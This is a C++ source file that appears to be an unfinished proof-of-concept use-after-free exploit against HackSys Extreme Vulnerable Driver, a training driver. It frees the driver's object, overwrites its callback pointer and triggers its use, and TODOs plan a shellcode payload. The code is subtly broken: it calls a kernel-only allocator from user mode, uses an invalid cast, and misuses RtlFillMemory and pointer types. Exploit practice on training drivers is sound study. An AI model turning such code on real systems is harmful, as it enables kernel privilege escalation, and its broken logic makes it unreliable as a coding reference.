#include <iostream>
#include <windows.h>

// IOCTL Definitions from HackSysExtremeVulnerableDriver.h
#define HACKSYS_EVD_IOCTL_ALLOCATE_UAF_OBJECT             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x804, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_USE_UAF_OBJECT                  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x805, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_FREE_UAF_OBJECT                 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x806, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_ALLOCATE_FAKE_OBJECT            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x807, METHOD_NEITHER, FILE_ANY_ACCESS)

// From Common.h
#define POOL_TAG 'kcaH'
typedef void (*FunctionPointer)();

// USE_AFTER_FREE object from UseAfterFree.h
typedef struct _USE_AFTER_FREE {
        FunctionPointer Callback;
        CHAR Buffer[0x54];
    } USE_AFTER_FREE, *PUSE_AFTER_FREE;

// Test function to test PoC
int test_func(){
    std::cout << "Hello from test function!\n";
}

int main(int argc, char* argv[]){
    // Print usage if not enough args
    if (argc < 1){
        std::cerr << "Usage: " << argv[0] << "IOCTL_index buffSize" << std::endl;
    }

    char devName[] = "\\\\.\\HackSysExtremeVulnerableDriver";
    DWORD inBuffSize = std::stoi(argv[1]);
    DWORD bytesRet = 0;
    BYTE* inBuffer = (BYTE*) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, inBuffSize);
    RtlFillMemory(inBuffer, inBuffSize, 'A');

    // Get a handle to the driver
    HANDLE dev = CreateFile(devName, GENERIC_READ | GENERIC_WRITE, 
                                NULL, NULL, OPEN_EXISTING, NULL, NULL);

    // Handle failure
    if (dev == INVALID_HANDLE_VALUE){
        std::cerr << "Could not get device handle" << std::endl;
        return 1;
    }

    std::cout << "Sending IOCTL\n";

    // Allocate the UAF Object
    BOOL status = DeviceIoControl(dev, HACKSYS_EVD_IOCTL_ALLOCATE_UAF_OBJECT,
                                    inBuffer, inBuffSize,
                                    NULL, 0, &bytesRet, NULL);

    // Free the UAF Object
    status = DeviceIoControl(dev, HACKSYS_EVD_IOCTL_FREE_UAF_OBJECT,
                                    inBuffer, inBuffSize,
                                    NULL, 0, &bytesRet, NULL);
    
    // Get address from user input
    int hex_addr;
    PUSE_AFTER_FREE addr;
    std::cout << "Input hex address of UAF Object\n";
    std::cin >> std::hex >> hex_addr;
    addr = (PUSE_AFTER_FREE) hex_addr;

    // Allocate space in memory for function
    int (*fncPtr)(){nullptr};
    
    // TODO: Change this to shellcode
    fncPtr = (fncPtr) ExAllocatePoolWithTag(NonPagedPool, sizeof(test_func), (ULONG)POOL_TAG);
    RtlFillMemory((PVOID)fncPtr, sizeof(test_func), test_func);

    // TODO: Fill the memory at the given address from user input with the function pointer
    addr->Callback = (FunctionPointer) fncPtr;

    // TODO: Can possible use RtlFillMemory to directly fill the input pointer with shellcode?
    // https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlfillmemory

    // Use the UAF Object after Free
    status = DeviceIoControl(dev, HACKSYS_EVD_IOCTL_USE_UAF_OBJECT,
                                    inBuffer, inBuffSize,
                                    NULL, 0, &bytesRet, NULL);

    // Close device
    CloseHandle(dev);
    return 0;
}
